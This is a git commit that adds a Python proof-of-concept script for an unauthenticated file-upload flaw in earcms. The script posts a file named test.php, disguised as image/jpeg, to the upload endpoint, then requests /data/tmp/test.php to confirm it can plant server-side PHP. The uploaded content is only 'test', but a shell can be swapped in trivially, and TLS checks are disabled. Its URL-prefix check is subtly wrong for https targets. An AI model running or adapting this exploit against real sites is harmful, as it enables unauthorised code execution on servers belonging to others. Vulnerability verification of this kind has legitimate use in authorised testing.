892e063a8bfce5676691e110db24884000910a2d
stevezheng <stevezheng1989@gmail.com>
2019-11-14 06:35:40 +0800

    新增 earcms的漏洞验证

---
+++ scripts/earcms.py
@@ -0,0 +1,33 @@
+#!/usr/bin/env python3
+# coding:utf-8
+
+import requests
+from requests_toolbelt import MultipartEncoder
+
+requests.packages.urllib3.disable_warnings()
+
+
+def poc(url):
+    if not url.startswith("http") or url.startswith('https'):
+        url = 'http://' + url
+    urls = url + '/source/pack/upload/index-uplog.php'
+    m = MultipartEncoder(
+        fields={'time': 'test', 'app': (
+            'test.php', 'test', 'image/jpeg')}
+    )
+    header = {
+        "Connection": "close",
+        "User-Agent": "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.103 Safari/537.36",
+        "Content-Type": m.content_type,
+        "Accept": "*/*",
+        "Accept-Language": "zh-CN,zh;q=0.9"
+    }
+    try:
+        r = requests.request("POST", urls, verify=False, data=m, headers=header, timeout=10)
+        url1 = url + '/data/tmp/test.php'
+        r2 = requests.get(url1)
+        if 'test' == r2.text:
+            return url1
+    except:
+        pass
+    return False
